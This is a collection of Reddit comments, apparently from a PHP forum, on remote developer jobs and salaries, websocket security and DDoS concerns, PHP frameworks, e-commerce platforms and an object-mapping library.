1. Language. This is really important to most US-based remote employers. Really. For example, it's not unreasonable to expect a senior level developer to have at least bachelor's level college writing and communication skills. 2. Professionalism. Most US-based remote employers expect a professional work environment: set hours, dedicated quiet workspace. The myth of the Starbucks remote worker is just that. Yes, in a pinch, it's an option. But many serious remote employers expect you to basically operate a small workplace in your home-office. 3. Quality and availability. The implicit promise, and sometimes explicit promise is, look you work from home and get some benefit from that, and I as the employer get better and more productivity. That means, look, less water cooler time, no office space stuff B.S. about singing to cakes or vacation chit-chat. 
I think luman may be best .
You can run websocket traffic through TLS https://devcenter.heroku.com/articles/websocket-security in much the same fashion as HTTP traffic through TLS (aka, `https`). If updates are not frequent enough to justify websockets, you can instead use AJAX long polling (opens connection, server sends trickles of data till event happens) or even [SSE](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events) depending on what browsers you need to support. There are also several libraries out there that will use the best possible option and auto-fall through to other options for you. [SocketIO](https://socket.io/) is one such option.
I get a lot of remote offers from linkedin and stackoverflow careers. I'd set up profiles there if I were you.
838 stars :thinking:
/r/php
For testing purposes. He wanted to help the community, to find bugs, to fix them.
Given the way it is asked, he is lookng for the place where he can post like "Here is my code it doesnt workkk!" and such posts are not welcome in /r/php
that's a good source of information, thanks
Instead of pulling each 5 seconds, why not use long-pooling? This way you only pull when you have content. I'd go like that instead of just throwing all away for websockets.
Let CI die, the only way it will be relevant if it is rewritten from scratch.
There's nothing inherently less secure about a connection which is held open. Depending on the webserver your once-per-5-second requests may result in a TCP session being held open (HTTP Keep-Alive) anyway.
I've been through this road, and I just want to share that I ended up using xmpp using ejabberd as a server and websockets routed through nginx proxy. I wrote a custom client interface using JS and Strophe. [Strophe](http://strophe.im/strophejs/) will take care of communicating with ejabberd, I only had to write event handlers for sending and receiving messages. The basic set up is like this: the chat server is accepting connections via wss (secure websocket) on a certain port. nginx is setup to forward connections to that port (acting as a proxy). The chat client, using strophe, is set to connect to the nginx server chat.example.com. I went this way because writing the chat server from the ground up looked like re-implementing ejabberd at the time, and it would have been a huge waste of time for something that would be basically a reinvented wheel, only poorly executed and poorly tested.
Well, unfortunatelly we cannot change much in the production server right now. One problem I see using headless chrome in own site, is the X11 libs, that we don't have, for some more performance. Is it possible to install headless chrome without those dependencies? 
&gt; what distinguishes a US hire from someone in Romania, Vietnam, Malaysia, or anyone else in the world who is probably cheaper? "Skills" sure Please do tell me that I totally misunderstand that you think US produces better "skilled" developers than said countries. Holy fuck, I surely must misunderstand this.
Try showcases of popular frameworks and such, eg. https://symfony.com/showcase/
Short story is Web Sockets are as secure as a normal HTTP request/response (or HTTPS request/response if you're using WSS). Do you find this secure depends on your needs. &gt; Seems simple enough, but a continuous open connection with the web server just screams security concerns to me. Does it just scream unintelligibly, or does it say something specific we can discuss?
I appreciate they made it few times slower and gained very little in terms of value.
Not tonnes of content, but what's there is excellent. Shawn McCool's "Dev Discussions". Intermediate/advanced: https://eventsourcery.com/podcast
Well, unfortunatelly we cannot change much in the production server right now. One problem I see using headless chrome in own site, is the X11 libs, that we don't have, for some more performance. Is it possible to install headless chrome without those dependencies? 
&gt; And Zend and Symfony are the only enterprise options on market... I say that a framework is "enterprise" when it offers Long Term Support, when it have a lot of contributors and at least 5 years of development. So that's why Laravel, CakePHP, Yii are also "enterprise" frameworks.
Funny, I was looking at this yesterday and came across the same file and had the same thoughts. I saw tons of PSR2 violations and couldn't help but think why rewrite CodeIgniter and NOT follow the framework standard recommendations?
Someone would say that Java is the only option for serious project these days. I think that every project has a best fitting solution. Laravel is good for some things, Symfony for others. Even Wordpress is fitting for some situations.
+1 This is better solution than rolling your own security and probably requires the least number of code changes.
To be honest, I still prefer chat rooms (IRC, slack etc). Forums seem to have been largely killed off by reddit and stack overflow (although there are still some good ones).
/r/phphelp isn't bad for getting help with stuff with coding problems.
Here's a quick-to-implement popup: https://getbootstrap.com/docs/3.3/javascript/#modals But as numerous people have said, it's JS not PHP
Yet it is trying to magically secure everything. I have used CodeIgnited and had a lot of problems with the way it does things and that meant diving into the source. It has a very bad habit of wrapping things with quite complex behaviour and being quite dumb. Like the DB layer where it would return an empty array for an empty row rather than just null. Nested transactions were completely broken. Loads of behaviour as well that wasn't easily modifiable. You have a mix of things that would like to be a stand alone function mixed in with other functionality. I remember this because I had to do things like hack it to allow nested routing. The only thing good about the framework is that in some ways it was simple when you used it minimally. It still took an immense amount of mangling though to make it do basic things. A lot of bad libraries as well just not to be trusted and stripped away or replaced. Pretty much ended up only using its db, routing and loading, all of which had to be augmented.
It is about the support they can offer..so for instance Symfony is backed by Sensio labs and Zend well yeah they are behind PHP. But if you are a company which starts to work on an enterprise project you want to have a contract with someone who can back the software you use and they can provide support, training and stuff. Also Laravel while capable of handling big projects it is meant for small and middle while Symfony and Zend are developed for million dollar projects ..with the difference that Symfony is great for smaller as well while Zend not really
I second the language. Sure remote devs know PHP well - but can they speak english well? (India is an exception here obviously)
https://en.wikipedia.org/wiki/Air_quotes
Learn databases: MySQL or Postgre to use with PHP(PDO class). After that, simple plan: 1. User system -&gt; Login, Logout, Register, Edit profile, Password reset 2. Profile picture upload and crop. 3. Now you know main basics. Maybe photos should be grayscale? Maybe users should have different access rights? Can users add each other to friend list? How to confirm request of other user? How to show it? Do this, and you will always have where to move forward. Maybe start using some framework: Symfony, Laravel - maybe Phalcon..? Just make some simple idea, and make it work.
Thanks! I've done 1 and 2, but not 3. I'll go ahead with that :D
Just always add new functionality. Maybe create something like 9gag, simple but has some good feature example. Page autoload and etc. Just keep writing code.
&gt; Unfortunately done on government hours, so I can't post. If you're talking about the US Federal government, it's actually the exact opposite: All works of intellectual property produced by the Federal Government are automatically in the public domain, and can be shared. But if you were working for a company and most state governments, they could sue you for posting any code from a project you were working on.
Sorry, I misunderstood.
That's not how this works. He can't release individual parts of it without an okay even if it's open source. They can easily dictate what their developers are allowed and not allowed to do with their software, especially while on company time. This is a silly thing to say.
Alright I'll do that :)
What about drupal’s commerce implementation or magneto?
Oh Look, a Shiny Thing! http://sylius.org/
I have read on internet [Sylius](http://sylius.org/) is really good.
Magento 2 is open source if you get the community version...but I very passionately and strongly urge you to not go down that path if you do not have experience with it as the learning curve is a pretty steep one. However it usually has a plugin for anything you could ever need, and you can create your own extensions/plugins/themes if you have the skill and time to learn. * https://www.commercehub.com/ * https://www.symphonycommerce.com * https://drupalcommerce.org/ Personally I have not worked with any of these other than Magento but they do seem to come up regularly when I ask questions about Magento.
P.S. And don't listen what people talk about good and bad programming languages. If you like javascript, write javascript, if yo like pascal, fuck it, write pascal. You can make a lot of moneys if you would know how program for mainboards, so actually there are no legacy systems.
Cool, I'll keep that in mind. I'm really enjoying PHP, but I'm also teaching myself JavaScript, which is also enjoyable. I just got a project from a former colleague where I have to create sort of a web based check-in/check-out system for employees at different workplaces, and he wants me to write it in PHP so I have something to systematically work towards. I'm still waiting for the HTML and CSS code that he has created, so I'm just learning to create more things in PHP while waiting for his code. Should be any day now :)
Good luck hiring that person for that wage...
https://weworkremotely.com
Taking into account UK companies have no problem hiring people who work remotely around Europe I would assume that it is not as big of an issue as you guys are putting it... but as a Portuguese who never had any linguistic issues every time I worked with Uk / Irish clients or remote employers I might be biased.
&gt; it lacks extensions What extensions is it lacking that you need? We can't really help you out if you don't tell us why your current solution is no good for your needs.
You understand hiring globally means hiring globally? Even in most Europe besides the nordic countries 60K is either average or way above average for a senior php developer. Let's not even take it to South America or Asia...
As a Lead Dev who specializes in Ecommerce I am going to suggest to you Sylius, and Magento 2. They both have their goods and bads, M2 has a lot more extensions by far but has a higher barrier of entry to a developer who is knew to it but overall both are great solutions. I have played with Drupal commerce. I will be honest I think it looks promising but I dont rate it highly just yet. It's good, but its a tack on effectively to me. If I have something in drupal and it wants ecommerce then I will work with it no problem. But I wont use it unless I am already tied to drupal in some way. 
timezones.
And I'm sure that $60,000 will be adjusted down to the local standard of living in South America or Asia.
As mentioned elsewhere, it's a vector for DDOS attacks.
I don't see how it is a vector anymore the standard requests and responses. HTTP 1.1 keeps the connection open as well.
Nicely done, could you walk me through a few use cases in a theoretical legacy code base? Legacy code and php frameworks already models that pass for DTO's in practical terms. A lot of mapping type solutions that happen in our code base are around coarse grained interfaces / facades, translating statuses from one object to another, and converting remote API calls into DTOs. The API calls usually come back as an array or json object. I could see this working swimmingly with a `stdClass` json result. I may have started to answer my own question. Thanks for putting this out into the world. Nice doc as well! 
Working with API's has been one of the main reasons that inspired me to make this library (as well as playing around with a command bus). The API wrapper would return something like a `ProductResponse` that had to be converted to our application specific `Product` class. This is where an object mapper is really useful to keep your code concise. As for your suggesting regarding the `stdClass`.. I feel really stupid, but the thought of mapping from a `stdClass` hadn't occurred to me yet (d'oh!). I don't believe it will work yet, but this is definitely going to the top of my list to test and implement. Thanks for the feedback!
You should be making around $90k-$100k in Vancouver.
http://builtwithlaravel.com/ https://symfony.com/showcase/ https://cakephp.org/showcase http://yiipowered.com/en 
This looks like it might be a nice way to convert [Atlas](https://github.com/atlasphp/Atlas.Orm) Record objects into Domain objects, and back again. (Apropos of [this documentation page](http://atlasphp.io/mapper/2.x/domain.html#1-1-10).)
Looks pretty good and solid to me. I'm going to give it a try pretty soon. I'm not sure I understand the need for naming conventions though. Seems to me you could just check every possibility until you find a match with some regex magic, since it's unlikely that more than one match will exist in either class? Lots of (other people's) classes have properties that aren't named consistently, and this would allow that, unless there's something obvious I'm missing. Of all the horribly confused naming schemes I've seen, I don't think I've ever come across a class that has more than one ['firstName', 'first_name', 'FirstName', 'firstname'].
languages and stuff like that are all for older versions, so so basically need to have an older version of opencart to use all the functionality...
I'm pretty sure normal HTTP connection are closed when the page is done loading though, right? Otherwise why would we need websockets?
Thanks for the response! The reason for naming conventions is because I didn't want to rely on magic too much. I'd rather explicitly register a property than guessing and possibly getting weird results. I'll definitely give this some thought though. It seems worth it to me to invest some time to create this behaviour and make you able to chose to use it via a configuration option. 
I totally relate. It's very tough to differentiate between a PHP Application Developer and a PHP CMS developer. Job postings don't always make this clear in their title. On the other hand, if you're googling around for a remote Ruby job, chances are you're going to find Web App Development 99% of the time. Trying to describe the difference between a PHP Web App developer an a PHP CMS developer is not so easy. 
+1 for Sylius and it's not released yet but [GetCandy](https://getcandy.io/) looks promising. 
Real magic is working, scalable, intelligible testable software...even at the cost of typing a few extra words or refactoring. Explicit behavior seems increasingly undervalued. 
I'm not arguing against that. But there's also a need for tools that get it right 90% of the time with minimal or no configuration needed. It only takes one test to check if it gets any names wrong. Also the name AutoMapper+, to me at least, makes me expect it to be able to help automate the otherwise tedious job of writing custom mappers.
the ddos vector is if somebody injects a js that opens a shit ton of ws connections to some site that the attacker wants to ddos, same can be done with creating a lot of iframes with javascript. ddos is not because it has a open connection to server its because you can script a lot of new ws connections just in javascript and every website can run javascript. im using a ws nodejs server because i need near instant ui update after something somwhere happens. for chat ws is perfect.
Really? I get paid the equivalent to less than half of that in my country for more or less the same job. You guys make a lot of money :)
This looks great! I submitted an issue for discussion on how to handle mapping to stdClass.
If you have all the proper type declarations in place, won't a tool such as PHPStan pick this up for you?
Yeah, but what happens if someone connects to your HTTP 1.1 endpoint with a full TCP handshake and intentionally sends over *very slowly*, more and more HTTP headers again and again and again? As far as your server's concerned the client is active and is still working on finishing their request, so it'll keep the socket open to wait for them to finish their request. The malicious individual just keeps doing this - opening more and more sockets with only partial requests going through that never complete - until your server hits the fd limit or whatever and can't open more sockets at all. Boom: denial of service achieved! Of course that doesn't work anymore as a rule: [slowloris](https://en.wikipedia.org/wiki/Slowloris_\(computer_security\)) attacks like I descibed above are well known and means of keeping it under wraps will be implemented for most any serious project.
Who says nobody takes issue with speculative property purchases? Plenty of people are pissed right the fuck off about it in certain big cities with inflated housing prices due to that exact behaviour. It's rent-seeking behaviour - it creates no actual product or service for anybody, it exists solely to move money from the pockets of someone that *does* want to put a resource to productive use into the pockets of someone that fully intends to do nothing with that resource.
Besides the ones you mentioned, I use Codecov. Coveralls has a bug where repos with names ending with ".PHP" simply won't work.
Welcome to Vancouver! There is [a meetup](https://www.meetup.com/Vancouver-PHP/), which meets approximately monthly (albeit every second meetup at the moment is a Laravel meetup). There are a few other meetup groups around Vancouver that you might be interested in as well: all the ones I know about are on meetup.com, so I would suggest poking around there. I'm not very well qualified to answer your salary question, since I neither work as a PHP developer nor for a Vancouver based company, but /u/Tie28's answer sounds in the right sort of ballpark to me.
Domain squatting is not free. They are betting that the domain is worth more than the registrar thinks it is. If it was obviously worth more than that wouldn't the registrar charge more? I'm not talking about squatting a known business with by acquiring their most obvious domain name before they do, but if a seems likely to be wanted in the future for a yet unknown business, I don't see anything too bad with that. You just saw the opportunity before someone else did. I'm not saying it is ideal, but in an ideal world we probably wouldn't even have money.
This looks pretty good. Is there a preferred way on how to deal with nested objects? Like a mapper inside a mapper? 
Wow I guess I'd never asked that much. Glad I asked here before ! Another questions pops in my mind reading you, do you negociate gross or net salary in Canada ? In France this is the gross salary, I guess in Canada this is the same but I could be wrong...
Just to confirm: Vancouver, BC, right? There is also a Vancouver in Washington ;) glassdoor.ca can help with salaries as well. Def a lot of companies hiring at the moment. 
Yep BC, sorry for the confusion :)
https://www.shopify.com
&gt;Domain squatting is not free. They are betting that the domain is worth more than the registrar thinks it is. Sure, and such bets produce no economic value. It's not like betting that someone's business idea is solid and therefore potentially turning your investment into larger returns by adding a new product/service to the economy or similar, it's just betting that you can make someone else pay more than you just did for the same resource without adding any value to the system yourself. &gt; I'm not saying it is ideal, but in an ideal world we probably wouldn't even have money. In a way, the squatter did provide value by putting money in the hands of the registrar who previously was not making any money off this valuable domain name. There's already a system in place for sitting on a potentially valuable namespace and reselling those names on an individual basis to individual organizations - it's being a registry and paying the dues to ICANN to get yourself a whole top-level domain to administer. ICANN gets money in order to cover the costs of being the international coordinator of all this, and you as a registry get to charge money in return for administering your specific TLDs. Domain squatting, as you put it, at very best works out by giving some registry a bit of money up front... but considering that demonstrating financial viability is already a pre-requisite to ICANN granting you the right to act as a registry for a given TLD it's hardly providing any meaningful benefit to anybody. In fact all it does is make it more of a hassle for someone trying to actually use the resource of that name for something productive and either increase their costs (if they give in to squatters) or increase the effort involved in finding a suitable name (if they don't). 
I wish I wasn't so lazy to do this ... then again doctrine lets you cheat this a bit.
If someone purchases it from the squatter, that just means the squatter was right, and it must have been worth what the new owner paid for it or else they would not have purchased it. Yes, the registrar is actually doing the work / providing the service, which is why the squatter had to pay them for it while they had it. Lots of things have a middle man, being a middle man is not bad.
Connections are kept open on 1.1 and later. Look up "keep alive". You, as a an app/site developer can't make use of this, but it is open. So the most accurate statement would be to say that with request/response, connections are kept open at the transport level but closed at the application level, while with sockets they're kept open at both levels.
It's not that Doctrine "cheats", it's that Doctrine is an ORM, and mapping relations to domain objects is the job of an ORM. Looks like Atlas isn't quite fully baked.
I thought Atlas is an ORM, can't it map to domain objects itself? Nobody calls JDBC, which produces Record objects an "ORM". Hibernate, built on top of it, which maps to domain objects, is the ORM. 
This looks like the missing piece I need to easily map DTO data into other stuff based on forms... Might experiment with this and the form handlers (hostne/form-handler-bundle)
The way it is currently implemented looks like this: $config-&gt;createMapping(Child::class, ChildDto::class); $config-&gt;createMapping(Parent::class, ParentDto::class) -&gt;forMember('child', Operation::mapTo(ChildDto::class)); This will make the `child` property of the parent to be mapped to the `ChildDto` class.
Long-polling for chat systems is definitely not the way to go. It's fairly demanding of the system in terms of resources. All PHP code and other content is kept in memory for each separate request. This means almost identical segments of memory from your PHP bootstrapping is kept in memory for little or no reason at all. And large portions may never be utilized. Websockets allows you to handle multiple separate requests using the same logic and only one instance of in-memory bootstrapping contents. If worried about security, there are ways around this. OP could implement a `nonce` and/or `nc` variation.
Jesus, calm down. Frameworks are reusable from project to project. That's their main advantage. You're criticizing use of frameworks from a "single-project" point of view, which is fair. But if you're asked to make another project - then either you move your *super efficient* code from the old project and paste it into the new one (seems like you're building a framework or a library set at least) or use a framework. No one forces you to use them.
You should add this example to the readme.
Nice tool, but what you name as DTO (e.g. `EmployeeDto`) is just a plain POCO (in PHP term a POPO) also known as stdClass. The class [Employee](https://github.com/mark-gerarts/automapper-plus#example-usage) with the constructor initialisation and the getter methods is a Value Object, because it's immutable. Please correct me if I'm wrong.
Been a PHP developer for 20 years. The correct answer is Shopify, unless you're Ikea you don't need to roll your own. 
I'm not sure locking yourself into a closed source, proprietary system, which you have no control over the code is not the correct answer for any developer.
Checked it just now: no. &lt;?php class TestX { /** * @param int $a * @return array|false */ public static function test($a) { return $a &gt; 10 ? false: array('b' =&gt; 123); } } var_dump(TestX::test(3)); var_dump(TestX::test(123)); var_dump(TestX::test(3)['b']); var_dump(TestX::test(123)['b']); $ php70 vendor/phpstan/phpstan/bin/phpstan analyse --level 7 src array(1) { ["b"]=&gt; int(123) } bool(false) int(123) NULL 0/1 [░░░░░░░░░░░░░░░░░░░░░░░░░░░░] 0% 1/1 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100% [OK] No errors Same for all the other levels as well. Some notes: it only works with PHP 7+, it actually needs to load the code (composer autoloader setup needed + I expect a static analyzer to read the file, not load it). The actual method in question is the memcached-&gt;get(), I use it with GET_EXTENDED, it returns an array with 3 elements, but on error it returns false - the issue was that I assumed that in case of the additional flag it will always return an array with empty values, well, it doesn't. :-)
Using closed source is a choice upto the reader, I suppose. (and from my point of view, PHP is a kind of closed source for me as well.)
And I am sure they actually say in the add that the location is anywhere: "Total compensation: $60,000/year Location: Global (remote) 40 hours per week" 
Take a look at CraftCommerce and X-Cart.
Say what?
I am not usually a grammar nazi, but I couldn't help but notice this, I really hope you edit your comment because every time I see it I scream a little inside.
Most don't need that control though if my point, if you run a shop that sells things you couldn't care less if the code is open source and uses spaces instead of tabs. If you're launching an ecom startup and want to impress with how good you at calculating global tax rules then shoot but I've built maybe 100 ecom sites in last 20 years, maybe 2 of them needed something Shopify couldn't offer and they all cost way more. Take a look at the Habitat site, I built it and Habitat wanted all sorts of bullshit they didn't need and it cost them nearly a million quid, was it really worth it when they could EXACTLY the same site on Shopify for maybe 50k... building your own things is great but sometimes, lots of the time, it's unnecessary. 
&gt; CI has even been abandoned by it's original creator Phil Sturgeon As far as I am aware Phil was one of the developers, not the creator. I belive it was Rick Ellis of EllisLabs who was the original creator, based on ExpressionEngine Source - https://ellislab.com/codeigniter
Sorry. Have dyslexia. Didn't notice that.
I am sorry I can't answer your question directly, but would it be impossible to just restart it in a more updated version of php? Because even if you find a shared hosting running on php 5.2.1 you will run into this problem sooner or later. That is the only long term solution I could see here, redo it, while you bite the bullet of having the old one without support for a few months until it is deployed and then replace them...
&gt; Nice tool, but what you name as DTO (e.g. EmployeeDto) is just a plain POCO (in PHP term a POPO) also known as stdClass. I disagree. A DTO should be a dedicated class and not be using the stdClass. Might as well use arrays for that instead.
No worries!
It's closed for me, but I don't care about that, because I have faith ;-)